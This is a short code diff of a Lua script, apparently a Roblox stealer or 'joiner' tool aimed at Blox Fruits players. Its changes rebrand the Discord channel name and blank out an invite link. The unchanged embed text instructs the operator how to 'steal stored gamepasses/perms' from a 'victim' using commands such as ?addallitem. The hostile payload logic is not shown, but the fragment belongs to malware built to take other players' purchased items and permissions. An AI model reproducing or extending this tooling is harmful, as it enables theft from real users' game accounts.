@@ -598,7 +598,7 @@ local embed = {
         {name = "Join " .. Sea .. " (Mobile COPY)", value = (Sea == "Sea 2" and Sea2Script or Sea3Script):gsub("```lua\n", ""):gsub("\n```", ""), inline = false},
         {name = "NOTES:", value = [[
 1. You can do ?addallitem or ?additem <name> to steal stored gamepasses/perms.
-2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in rua hub channel "Commands for bf joiner"
+2. If victim doesn't do any action automatically, you can try doing chat commands. Check them in  Blueshub channel "Commands for bf joiner"
 3. If victim Isn't on the server, it means he left.
 ]], inline = false}
     }
@@ -1282,7 +1282,7 @@ local function createDiscordUI()
     end)
     
     Button.MouseButton1Click:Connect(function()
-        setclipboard("https://discord.gg/zJKDqRd5")
+        setclipboard("https://discord.gg/")
         Button.Text = "Copied!"
         task.delay(2, function() Button.Text = "Copy Invite" end)
     end)
